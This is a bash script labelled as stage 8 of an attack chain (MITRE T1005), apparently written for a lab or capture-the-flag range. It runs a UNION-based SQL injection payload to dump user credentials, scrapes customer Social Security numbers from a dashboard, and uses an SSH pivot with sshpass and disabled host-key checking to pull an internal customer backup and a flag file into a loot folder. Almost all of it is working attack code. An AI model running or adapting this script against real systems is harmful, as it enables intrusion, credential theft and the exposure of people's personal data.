#!/bin/bash
# Stage 8 — Collection  (MITRE T1005 Data from Local System)
#   (a) UNION-based SQLi to dump users (creds) + customers (PII) over HTTP
#   (b) Steal the internal backup export via the SSH pivot
source "$(dirname "$0")/lib.sh"
banner "STAGE 8 — COLLECTION (T1005)"

[ -f "$COOKIE" ] || sqli_login || { err "need a session"; exit 1; }
[ -f "$LOOT/creds.env" ] && source "$LOOT/creds.env"

log "(a) UNION SQLi dumping the users + customers tables ..."
PAYLOAD="' UNION SELECT id,username,password,role,4,5 FROM users -- -"
curl -s -G -b "$COOKIE" "http://$TARGET/dashboard" --data-urlencode "q=$PAYLOAD" \
  | grep -oP '(?<=<td>)[^<]+' > "$LOOT/08-sqli-dump.txt"
# also pull the raw customer PII (default dashboard listing)
curl -s -b "$COOKIE" "http://$TARGET/dashboard" \
  | grep -oE '[0-9]{3}-[0-9]{2}-[0-9]{4}' | sort -u > "$LOOT/08-ssns.txt"
ok "Harvested credentials (sample):"; grep -E 'admin123|Password1|password|Summer2024' "$LOOT/08-sqli-dump.txt" | head -5 || true
ok "Harvested $(wc -l < "$LOOT/08-ssns.txt") customer SSNs -> $LOOT/08-ssns.txt"

echo
log "(b) Stealing the internal backup export via the SSH pivot ..."
rce "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 ${SSH_USER}@${INTERNAL_HOST} 'cat backups/customer_export.csv; cat backups/FLAG.txt'" \
  | tee "$LOOT/08-internal-backup.txt"
ok "Crown-jewel data staged in $LOOT/"
